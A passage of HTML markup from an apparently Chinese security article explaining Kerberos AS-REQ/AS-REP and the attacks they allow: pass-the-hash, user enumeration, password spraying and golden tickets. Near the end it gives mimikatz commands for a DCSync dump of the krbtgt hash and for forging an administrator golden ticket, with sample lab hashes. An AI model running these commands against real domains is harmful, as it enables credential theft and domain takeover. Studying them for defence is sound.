8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">AS-REQ阶段产生的攻击方式</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.HASH传递</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.684954280964256" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/5_x0cLNJaB3f7aaaS2QlJicvQ7J352gw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIcqhEsD11uhEKwOGic8wdQBgVEJx0cLNJaB3f7aaaS2QlJicvQ7J352gw/640?wx_fmt=png'" data-type="png" data-w="1203" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />只适用于域环境，并且目标主机需要安装 KB2871997补丁 PTK<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.域内用户枚举</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。user.txt不需要加上@0day.org，也可以使用udp<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.580029368575624" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/6_xcbtlzdjrTnny25deDnusccS0iaGtw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIC084X1wF5TPR08ibHOsKD2nrkzxcbtlzdjrTnny25deDnusccS0iaGtw/640?wx_fmt=png'" data-type="png" data-w="681" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.密码喷洒</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">针对明文：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23567708333333334" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/7_J94nztBtT7yAr1N2iaLBuIm1VO8yYQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIyBUXaJPHRTze1mpYLLIUqUWDYJ94nztBtT7yAr1N2iaLBuIm1VO8yYQ/640?wx_fmt=png'" data-type="png" data-w="768" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">针对ntlm hash：<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.22580645161290322" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/8_n24h0pUEpqJliaiclD5aehC4BpxtuQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgibEU1ibgIg4Ne8fvtqWWDSRMGHWn24h0pUEpqJliaiclD5aehC4BpxtuQ/640?wx_fmt=png'" data-type="png" data-w="868" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">AS-REP</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">2、<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">AS-REP</strong>：当KDC接收到请求之后，通过AD活动目录查询得到该用户的密码Hash，用该密码Hash对请求包的Authenticator进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，且不是重放，于是预认证成功。KAS成功认证对方的身份之后，发送响应包给客户端。响应包中主要包括：<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">krbtgt用户的NTLM Hash加密后的TGT认购权证(<strong style="-webkit-tap-highlight-color: transparent;line-height: 1.75;">即ticket这部分</strong>)</strong>&nbsp;和&nbsp;<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">用户NTLM Hash加密的Login Session&nbsp;key(<strong style="-webkit-tap-highlight-color: transparent;line-height: 1.75;">即最外层 enc-part 这部分</strong>)</strong>&nbsp;以及一些其他信息。该Login Session Key的作用是用于确保客户端和KDC下阶段之间通信安全。最后TGT认购权证、加密的Lgoin Session Key、时间戳 和 PAC等信息会发送给客户端。PAC中包含用户的SID，用户所在的组等一些信息。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6009280742459396" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/9_XHRx32u2uSq6bWxvfGicDRwLnDFfkQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIahvehymsebodIZVo2N80KdfwnXHRx32u2uSq6bWxvfGicDRwLnDFfkQ/640?wx_fmt=png'" data-type="png" data-w="862" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。<br style="-webkit-tap-highlight-color: transparent;"  />AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">AS-REP阶段产生的攻击方式</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.黄金票据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">伪造黄金票据的前提：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>要伪造的域用户(这里我们一般填写域管理员账户)</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域的SID值(就是域成员SID值去掉最后的)</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>krbtgt账号的哈希值或AES-256值</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">1.使用mimikatz</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">先获取krbtgt hash：<br style="-webkit-tap-highlight-color: transparent;"  />在域控执行</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"lsadump::dcsync /domain:0day.org /user:krbtgt"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">得到如下信息：<br style="-webkit-tap-highlight-color: transparent;"  />sid：S-1-5-21-1812960810-2335050734-3517558805<br style="-webkit-tap-highlight-color: transparent;"  />ntlm hash：36f9d9e6d98ecf8307baf4f46ef842a2<br style="-webkit-tap-highlight-color: transparent;"  />aes256：dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />伪造用户administrator执行(aes256)</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">gold</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">伪造用户administrator执行(krbtgt hash)</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">gold</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, 